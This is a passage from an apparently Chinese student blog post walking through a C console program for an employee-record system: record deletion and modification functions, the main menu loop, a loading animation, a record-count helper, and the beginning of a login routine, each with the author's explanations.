punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token punctuation">;</span> j<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>position<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>addr<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>tel<span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//将read[j]进行移位，达到删除的目的；</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭文件</span>    <span class="token keyword">char</span> ch<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//定义一个</span>    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"wb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"删除失败！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp1<span class="token punctuation">;</span>    fp1<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"data.txt"</span><span class="token punctuation">,</span><span class="token string">"w+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//使用一个txt格式的文件作为辅助，进行数据量的计数。</span>    <span class="token function">itoa</span><span class="token punctuation">(</span>NUM<span class="token punctuation">,</span>ch<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//一个没学过的函数，把整形数转化成字符型；</span>    <span class="token function">fputs</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f_5</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">)</span><span class="token comment">//在文件中读取数据，对数据进行修改，最后在存入文件中。</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> read<span class="token punctuation">[</span>NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> find<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    FILE <span class="token operator">*</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要修改的职工号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>find<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">,</span>find<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.修改员工号                   2.修改姓名             ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   3.修改性别                     4.修改担任职务         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   5.修改年龄                     6.修改员工工资         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   7.修改员工家庭住址             8.修改员工联系方式     ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            p<span class="token operator">=</span>workers<span class="token punctuation">;</span>            <span class="token keyword">int</span> n<span class="token punctuation">;</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>n<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工号:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>jobNo<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入姓名:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入性别:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入所担任职务:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入年龄："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>year<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入工资:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入家庭住址："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入员工联系方式："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>read<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>tel<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//以全部重新输入的形式去替换原本数据，达到修改的目的；</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.dat"</span><span class="token punctuation">,</span><span class="token string">"wb+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span>read<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NUM<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"文件修改失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"修改成功！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Hollow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//最后返回操作界面；</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>####&nbsp;&nbsp;&nbsp;3.1.3main.c</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include&quot;gongshi.h&quot;int main()&#123;    smile() ;    struct workers *workers;    workers &#x3D; (struct workers*)malloc(sizeof(struct workers));    int flag_1;    int n;    flag_1&#x3D;sign();    see();    if(flag_1&#x3D;&#x3D;2)    &#123;        system(&quot;cls&quot;);        Hollow();        while (1)        &#123;            scanf(&quot;%d&quot;,&amp;n);            if(n&#x3D;&#x3D;1)                f_1(workers);            else if(n&#x3D;&#x3D;2)                f_2(workers);            else if(n&#x3D;&#x3D;3)            &#123;                int n;                system(&quot;cls&quot;);                printf(&quot;请输入查询方式             1.   员工号查询         2.姓名查询\n&quot;);                scanf(&quot;%d&quot;,&amp;n);                if (n&#x3D;&#x3D;1)f_3_1(workers);                else if (n&#x3D;&#x3D;2)f_3_2(workers);            &#125;            else if(n&#x3D;&#x3D;4)                f_4(workers);            else if(n&#x3D;&#x3D;5)                f_5(workers);            else if(n&#x3D;&#x3D;6)            &#123;                f_6(n);                break;            &#125;            else            &#123;                int n;                system(&quot;cls&quot;);                printf(&quot;请输入正确的功能编号!\n&quot;);                system(&quot;pause&quot;);                system(&quot;cls&quot;);                Hollow();            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2分函数讲解"><a href="#3-2分函数讲解" class="headerlink" title="3.2分函数讲解"></a>3.2分函数讲解</h4><h6 id="3-2-1登录过场动画"><a href="#3-2-1登录过场动画" class="headerlink" title="3.2.1登录过场动画"></a>3.2.1登录过场动画</h6><pre class="line-numbers language-none"><code class="language-none">void smile()&#x2F;&#x2F;1、系统加载界面&#123;    int i;    printf(&quot;\n\n\n\n&quot;);    printf(&quot;\t\t\t\t\t系统加载中\n&quot;);    printf(&quot;\t\t\t&quot;);    for(i &#x3D; 0; i &lt;20; i++)    &#123;        printf(&quot;$ &quot;);        if(i &#x3D;&#x3D;19)            printf(&quot;\n&quot;);        Sleep(100);        &#x2F;&#x2F;使计算机进入短暂的休眠状态100毫秒    &#125;    system(&quot;cls&quot;);    printf(&quot;\n\n\n\n&quot;);    printf(&quot;\t\t\t\t\t系统加载完成！\n&quot;);    printf(&quot;\t\t\t\t\t  欢迎使用！\n&quot;);    Sleep(500);    system(&quot;cls&quot;);&#x2F;&#x2F;执行清屏操作&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个负责整活的过场动画，对于整个系统来说可有可无，但是可以丰富整个程序，避免这个程序过于简陋。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 for循环和sleep（）函数搭配使用，每隔0.1秒输出一个$,做到登录动画；<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 system(“cls”)函数清屏，输出系统加载完成，欢迎使用。</p><h6 id="3-2-2辅助文件读取函数（）"><a href="#3-2-2辅助文件读取函数（）" class="headerlink" title="3.2.2辅助文件读取函数（）"></a>3.2.2辅助文件读取函数（）</h6><pre class="line-numbers language-none"><code class="language-none">void see (void)&#x2F;&#x2F;该函数是从辅助文件中读取员工个数；&#123;    FILE *fp1;    char ch[10];    fp1&#x3D;fopen(&quot;data.txt&quot;,&quot;r+&quot;);    &#x2F;&#x2F;data.txt为辅助的文本文件；    if (fp1&#x3D;&#x3D;NULL)    &#123;        printf(&quot;人数预存文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fgets(ch,3,fp1);    NUM&#x3D;atoi(ch);    fclose(fp1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 我使用了名为<strong>data.txt</strong>的文本文件进行辅助，在运行这个文件时需要有一个函数读取文件中的数据。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 使用fets（）函数以字符串的形式将数据从文本文件中读取出来，此时从文本文件中读取出来的是字符串，这里我们就用到一个atoi（）函数将字符串转化为整形数。</p><blockquote><p>其实这个地方用格式化读取<strong>fscanf（fp，“%d”，&amp;NUM）；</strong>完全可以做到，作者使用的方式完全多此一举，但考虑到实训要有和其他组不同的特色，故采取了这种下策，并不建议模仿。</p></blockquote><h6 id="3-2-3登录页面"><a href="#3-2-3登录页面" class="headerlink" title="3.2.3登录页面"></a>3.2.3登录页面</h6><pre class="line-numbers language-none"><code class="language-none">int sign(void)&#123;    int n;    struct workers *workers;    workers &#x3D; (struct workers*)malloc(sizeof(struct workers));    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    printf(&quot;\t\t\t||                  